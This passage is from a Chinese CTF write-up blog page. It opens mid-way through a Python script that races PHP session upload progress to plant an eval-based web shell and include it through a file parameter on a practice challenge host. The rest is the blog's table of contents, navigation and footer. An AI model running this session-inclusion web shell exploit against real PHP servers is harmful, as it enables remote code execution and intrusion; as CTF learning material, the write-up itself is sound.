io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  </span><br><span class="line">resp = session.post( <span class="string">&#x27;http://node4.anna.nssctf.cn:28832/&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">resp = session.post(<span class="string">&#x27;http://node4.anna.nssctf.cn:28832/?file=/tmp/sess_&#x27;</span>+sessid,data=data)  </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:  </span><br><span class="line"><span class="built_in">print</span>(resp.text)  </span><br><span class="line">event.clear()  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">event=threading.Event()  </span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):  </span><br><span class="line">threading.Thread(target=write,args=(session,)).start()  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):  </span><br><span class="line">threading.Thread(target=read,args=(session,)).start()  </span><br><span class="line">event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-05-30 15:26:40" itemprop="dateModified" datetime="2023-05-30T15:26:40+08:00">2023-05-30</time>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://hq185187.github.io/2023/05/12/nssctf2/" title="NSSCTF2">https://hq185187.github.io/2023/05/12/nssctf2/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;10&#x2F;30&#x2F;Z5W6r2BSoiThHG1.jpg" title="沙箱逃逸初学习">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>沙箱逃逸初学习</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/05/14/LitCTF2023/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;10&#x2F;30&#x2F;Z5W6r2BSoiThHG1.jpg" title="LitCTF2023">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>LitCTF2023</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#15ciscn-2019%E5%8D%8E%E5%8C%97day2web1"><span class="toc-number">1.</span> <span class="toc-text"> 15.[CISCN 2019 华北 Day2] Web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16hctf-2018warmup"><span class="toc-number">2.</span> <span class="toc-text"> 16.[HCTF 2018]Warmup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021esay_evalredis"><span class="toc-number">3.</span> <span class="toc-text"> 17.[天翼杯 2021] esay_eval–REDIS]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18%E5%AE%89%E6%B4%B5%E6%9D%AF-2020normal-ssti"><span class="toc-number">4.</span> <span class="toc-text"> 18.[安洵杯 2020] Normal SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19hnctf-2022-week3ssssti"><span class="toc-number">5.</span> <span class="toc-text"> 19.[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20gdouctf-2023ez_ze"><span class="toc-number">6.</span> <span class="toc-text"> 20.[GDOUCTF 2023]&lt;ez_ze&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21gdouctf-2023%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-number">7.</span> <span class="toc-text"> 21.[GDOUCTF 2023] 受不了一点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22gdouctf-2023%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="toc-number">8.</span> <span class="toc-text"> 22.[GDOUCTF 2023] 反方向的钟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23hznuctf-2023-preliminaryflask"><span class="toc-number">9.</span> <span class="toc-text"> 23.[HZNUCTF 2023 preliminary]flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24hznuctf-2023-preliminaryppppop"><span class="toc-number">10.</span> <span class="toc-text"> 24.[HZNUCTF 2023 preliminary]ppppop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25hdctf-2023loginmaster"><span class="toc-number">11.</span> <span class="toc-text"> 25.[HDCTF 2023]LoginMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-number">11.1.</span> <span class="toc-text"> Quine 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#replace%E5%87%BD%E6%95%B0"><span class="toc-number">11.1.1.</span> <span class="toc-text"> replace () 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#quine%E5%9F%BA%E6%9C%AC%E5%BD%A2%E5%BC%8F"><span class="toc-number">11.1.2.</span> <span class="toc-text"> Quine 基本形式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26hznuctf-2023-preliminaryezlogin"><span class="toc-number">12.</span> <span class="toc-text"> 26.[HZNUCTF 2023 preliminary]ezlogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27hgame-2023-week1guess-who-i-am"><span class="toc-number">13.</span> <span class="toc-text"> 27.[HGAME 2023 week1]Guess Who I Am</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28hgame-2023-week4shared-diary"><span class="toc-number">14.</span> <span class="toc-text"> 28.[HGAME 2023 week4]Shared Diary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29hznuctf-2023-finaleznode"><span class="toc-number">15.</span> <span class="toc-text"> 29.[HZNUCTF 2023 final]eznode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021easycleanup"><span class="toc-number">16.</span> <span class="toc-text"> 30.[第五空间 2021] EasyCleanup</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/2023/04/26/nessctf/" rel="bookmark" title="NSSCTF1">NSSCTF1</a></li><li class="active"><a href="/2023/05/12/nssctf2/" rel="bookmark" title="NSSCTF2">NSSCTF2</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="hq185187"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">hq185187</p>
  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">22</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">2</span>
        <span class="name">分类</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/05/14/LitCTF2023/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
</div>

    <span><a href="/2023/04/26/nessctf/" title="NSSCTF1">NSSCTF1</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/14/LitCTF2023/" title="LitCTF2023">LitCTF2023</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
</div>

    <span><a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" title="时间盲注">时间盲注</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
</div>

    <span><a href="/2023/04/28/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">116k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">1:45</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/05/12/nssctf2/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
